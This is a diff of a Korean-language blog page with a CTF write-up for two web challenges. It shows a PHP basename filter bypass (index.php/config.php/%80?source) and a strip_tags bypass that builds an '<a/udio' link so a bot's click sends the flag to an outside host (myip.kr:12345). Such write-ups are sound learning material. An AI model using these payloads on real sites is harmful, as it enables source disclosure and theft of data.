@@ -108,7 +108,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   <body>
     
 
-<header id="l_header" class="l_header auto shadow blur show" style='opacity: 0' >
+<header id="l_header" class="l_header always shadow blur show"  >
   <div class='container'>
   <div id='wrapper'>
     <div class='nav-sub'>
@@ -388,34 +388,112 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   
   
-  <h3 id="1-web-can-you-guess-it-338-pt"><a href="#1-web-can-you-guess-it-338-pt" class="headerlink" title="1. [web] can you guess it?(338 pt)"></a>1. [web] can you guess it?(338 pt)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$secret</span> = bin2hex(random_bytes(<span class="number">64</span>));</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$guess</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;guess&#x27;</span>];</span><br><span class="line">  <span class="keyword">if</span> (hash_equals(<span class="variable">$secret</span>, <span class="variable">$guess</span>)) &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Congratulations! The flag is: &#x27;</span> . FLAG;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$message</span> = <span class="string">&#x27;Wrong.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">  highlight_file(basename(<span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>]));</span><br><span class="line">  <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+  <h3 id="1-web-can-you-guess-it-338-pt"><a href="#1-web-can-you-guess-it-338-pt" class="headerlink" title="1. [web] can you guess it?(338 pt)"></a>1. [web] can you guess it?(338 pt)</h3><pre><code class="php">&lt;?php
+include &#39;config.php&#39;; // FLAG is defined in config.php
+
+if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
+  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
+&#125;
+
+if (isset($_GET[&#39;source&#39;])) &#123;
+  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
+  exit();
+&#125;
+
+$secret = bin2hex(random_bytes(64));
+if (isset($_POST[&#39;guess&#39;])) &#123;
+  $guess = (string) $_POST[&#39;guess&#39;];
+  if (hash_equals($secret, $guess)) &#123;
+    $message = &#39;Congratulations! The flag is: &#39; . FLAG;
+  &#125; else &#123;
+    $message = &#39;Wrong.&#39;;
+  &#125;
+&#125;
+?&gt;</code></pre>
+<pre><code class="php">if (isset($_GET[&#39;source&#39;])) &#123;
+  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));
+  exit();
+&#125;</code></pre>
 <p>해당 부분을 보면 PHP_SELF 인자를 이용해서 다른 경로의 파일을 읽어올 수 있다.</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">&#x27;/config\.php\/*$/i&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;PHP_SELF&#x27;</span>])) &#123;</span><br><span class="line">  <span class="keyword">exit</span>(<span class="string">&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="php">&lt;?php
+
+if (preg_match(&#39;/config\.php\/*$/i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;
+  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);
+&#125;</code></pre>
 <p>config.php 파일에 flag가 있기 때문에 이 파일을 읽어주면 되는데,</p>
 <p>정규식 표현으로 입력값 필터링을 하고 있다.</p>
 <p>그런데 php 에서 basename 함수는 문자 \x80 ~ xff 까지의 범위는 무시하기 때문에 적절하게 이용할 수 있다면 필터링 우회가 가능하다.</p>
 <p><code> index.php/config.php/%80?source </code></p>
 <hr>
-<h3 id="2-web-music-blog-653-pt"><a href="#2-web-music-blog-653-pt" class="headerlink" title="2. [web] music blog(653 pt)"></a>2. [web] music blog(653 pt)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = <span class="string">&#x27;zer0pts&#123;&lt;censored&gt;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (snipped)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> crawl = async (url) =&gt; &#123;</span><br><span class="line">    console.log(`[+] Query! ($&#123;url&#125;)`);</span><br><span class="line">    <span class="keyword">const</span> page = await browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        await page.setUserAgent(flag);</span><br><span class="line">        await page.<span class="keyword">goto</span>(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">&#x27;networkidle0&#x27;</span>,</span><br><span class="line">            timeout: <span class="number">10</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        await page.click(<span class="string">&#x27;#like&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        console.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    await page.close();</span><br><span class="line">    console.log(`[+] Done! ($&#123;url&#125;)`)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="2-web-music-blog-653-pt"><a href="#2-web-music-blog-653-pt" class="headerlink" title="2. [web] music blog(653 pt)"></a>2. [web] music blog(653 pt)</h3><pre><code class="php">&lt;?php
+
+// (snipped)
+
+const flag = &#39;zer0pts&#123;&lt;censored&gt;&#125;&#39;;
+
+// (snipped)
+
+const crawl = async (url) =&gt; &#123;
+    console.log(`[+] Query! ($&#123;url&#125;)`);
+    const page = await browser.newPage();
+    try &#123;
+        await page.setUserAgent(flag);
+        await page.goto(url, &#123;
+            waitUntil: &#39;networkidle0&#39;,
+            timeout: 10 * 1000,
+        &#125;);
+        await page.click(&#39;#like&#39;);
+    &#125; catch (err)&#123;
+        console.log(err);
+    &#125;
+    await page.close();
+    console.log(`[+] Done! ($&#123;url&#125;)`)
+&#125;;</code></pre>
 <p>문제에 보면 게시글을 올릴 수 있는 기능이 있다.</p>
 <p>그리고 worker.js 파일을 보면 봇이 쿠키를 가지고 있음을 알 수 있다.</p>
 <p>그럼 두가지를 요약해서 보면 봇이 내 게시글을 읽어서 봇의 쿠키를 빼돌려야 한다.</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">section</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;mt-4&quot;</span>&gt;</span></span><br><span class="line">      &lt;?php if ($post[&#x27;published&#x27;] === &#x27;0&#x27;) &#123; ?&gt;<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-secondary&quot;</span>&gt;</span>Secret<span class="tag">&lt;/<span class="name">span</span>&gt;</span>&lt;?php &#125; ?&gt;</span><br><span class="line">      &lt;?= $post[&#x27;title&#x27;] ?&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;text-muted&quot;</span>&gt;</span>by &lt;?= $post[&#x27;username&#x27;] ?&gt; <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;badge badge-love badge-pill&quot;</span>&gt;</span>♥ &lt;?= $post[&#x27;likes&#x27;] ?&gt;<span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">      &lt;?= render_tags($post[&#x27;content&#x27;]) ?&gt;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;mt-3&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;like.php?id=&lt;?= $post[&#x27;id&#x27;] ?&gt;&quot;</span> <span class="attr">id</span>=<span class="string">&quot;like&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-love&quot;</span>&gt;</span>♥ Like this post<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">section</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="html">&lt;section&gt;
+  &lt;div class=&quot;container&quot;&gt;
+    &lt;h1 class=&quot;mt-4&quot;&gt;
+      &lt;?php if ($post[&#39;published&#39;] === &#39;0&#39;) &#123; ?&gt;&lt;span class=&quot;badge badge-secondary&quot;&gt;Secret&lt;/span&gt;&lt;?php &#125; ?&gt;
+      &lt;?= $post[&#39;title&#39;] ?&gt;
+    &lt;/h1&gt;
+    &lt;span class=&quot;text-muted&quot;&gt;by &lt;?= $post[&#39;username&#39;] ?&gt; &lt;span class=&quot;badge badge-love badge-pill&quot;&gt;♥ &lt;?= $post[&#39;likes&#39;] ?&gt;&lt;/span&gt;&lt;/span&gt;
+    &lt;div class=&quot;mt-3&quot;&gt;
+      &lt;?= render_tags($post[&#39;content&#39;]) ?&gt;
+    &lt;/div&gt;
+    &lt;div class=&quot;mt-3&quot;&gt;
+      &lt;a href=&quot;like.php?id=&lt;?= $post[&#39;id&#39;] ?&gt;&quot; id=&quot;like&quot; class=&quot;btn btn-love&quot;&gt;♥ Like this post&lt;/a&gt;
+    &lt;/div&gt;
+  &lt;/div&gt;
+&lt;/section&gt;</code></pre>
 <p>게시글을 올리면 제목, 내용 그리고 like(좋아요?) 같은 버튼이 만들어 진다.</p>
 <p>로직을 보면 봇이 like 버튼을 눌러주고 도망가는 구조이기 때문에 이 like 버튼을 누를 때</p>
 <p>리다이렉션을 시켜서 서버로 플래그가 날아오게 하면 될 것 같다.</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span>(<span class="params">$str</span>) </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">&#x27;/\[\[(.+?)\]\]/&#x27;</span>, <span class="string">&#x27;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#x27;</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">&#x27;&lt;audio&gt;&#x27;</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<pre><code class="js">function render_tags($str) &#123;
+  $str = preg_replace(&#39;/\[\[(.+?)\]\]/&#39;, &#39;&lt;audio controls src=&quot;\\1&quot;&gt;&lt;/audio&gt;&#39;, $str);
+  $str = strip_tags($str, &#39;&lt;audio&gt;&#39;); // only allows `&lt;audio&gt;`
+  return $str;
+&#125;</code></pre>
 <p>하지만 입력값 필터링이 걸려 있다.</p>
 <p>그런데 strip_tags 함수를 사용하는데 이 함수에서 /(slash) 를 사용하면</p>
 <p>audio -&gt; a/udio -&gt; a 태그로 만들어 낼 수 있다.</p>
 <p>즉, 태그를 만들어 주고 like 클릭 이벤트를 다른 서버로 돌려서 플래그를 탈취하면 된다.</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a/udio href=&#x27;myip.kr:12345&#x27; id=&#x27;like&#x27;&gt;like</span><br></pre></td></tr></table></figure>
+<pre><code class="html">&lt;a/udio href=&#39;myip.kr:12345&#39; id=&#39;like&#39;&gt;like</code></pre>
+
   
   
     
     <div class='footer'>
       
+      
+        
+  <div class="related_posts">
+    <section class='header'>
+      <i class="fas fa-bookmark fa-fw" aria-hidden="true"></i><span>Related Posts</span>
+    </section>
+    <section class='body'>
+      <div class="vlts-rps"><a class="item" href="/2020/04/10/angstormctf-200410/" title="angstorm ctf 2020 Write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">angstorm ctf 2020 Write up</span></a><a class="item" href="/2020/12/26/christmasctf-201226/" title="ChristmasCTF 2019 Write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">ChristmasCTF 2019 Write up</span></a><a class="item" href="/2020/11/21/bob-bisc-201129/" title="BISC CTF 2020(oldschool) write up" rel="bookmark "><img src="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" class="lazyload placeholder" data-srcset="https://uploadbeta.com/api/pictures/random/?key=BingEverydayWallpaperPicture" srcset="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@3/img/placeholder/c617bfd2497fcea598e621413e315c368f8d8e.svg" /><span class="title">BISC CTF 2020(oldschool) write up</span></a></div></section></div>
       
       
       
@@ -429,10 +507,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2021-01-17T18:01:16+09:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2020-04-10T00:00:00+09:00">
   <a class='notlink'>
     <i class="fas fa-edit fa-fw" aria-hidden="true"></i>
-    <p>EditJan 17, 2021</p>
+    <p>EditApr 10, 2020</p>
   </a>
 </div>
 
@@ -465,7 +543,8 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       
         <a class='prev' href='/2020/04/10/angstormctf-200410/'>
           <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>angstorm ctf 2020 Write up</p>
-          <p class='content'>1. [WEB - The Magic Word]12345678910&lt;script&gt;    var msg = document.getElementById(&quot;mag...</p>
+          <p class='content'>1. [WEB - The Magic Word]&lt;script&gt;
+    var msg = document.getElementById(&quot;magic&quot;);...</p>
         </a>
       
       
@@ -473,7 +552,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
           <p class='title'>zixem challenge Write up<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
           <p class='content'>Site : https://www.zixem.altervista.org/SQLi/
 
-1. LEVEL-11id=0%20union%20select%201,version(),3;-...</p>
+1. LEVEL-1id=0%20union%20select%201,version(),3;--...</p>
         </a>
       
     </div>
@@ -552,42 +631,6 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
   <footer class="footer clearfix">
     <br><br>
-    
-      
-        <div class="aplayer-container">
-          
-
-
-        </div>
-      
-    
-      
-        <br>
-        <div class="social-wrapper">
-          
-            
-          
-            
-          
-            
-          
-        </div>
-      
-    
-      
-        <div><p>Blog content follows the <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en">Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0) License</a></p>
-</div>
-      
-    
-      
-        
-      
-    
-      
-        Use
-        <a href="https://github.com/volantis-x/hexo-theme-volantis/tree/4.3.0" target="_blank" class="codename">Volantis</a>
-        as theme
-      
     
       
         <div class='copyright'>
@@ -723,6 +766,8 @@ var loadCSS = function( href, before, media, attributes ){
   
   loadCSS("https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.css", window.volantis.loadcss);
   
+  
+  loadCSS("https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/styles/solarized-light.min.css", window.volantis.loadcss);
   
 </script>
 <!-- required -->
@@ -1098,6 +1143,20 @@ $(function () {
 
 
 
+
+  
+
+<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@10/build/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<script>
+volantis.pjax.push(()=>{
+	document.querySelectorAll('pre code').forEach((block) => {
+	  hljs.highlightBlock(block);
+	});
+},"highlightjs")
+</script>
 
 
 
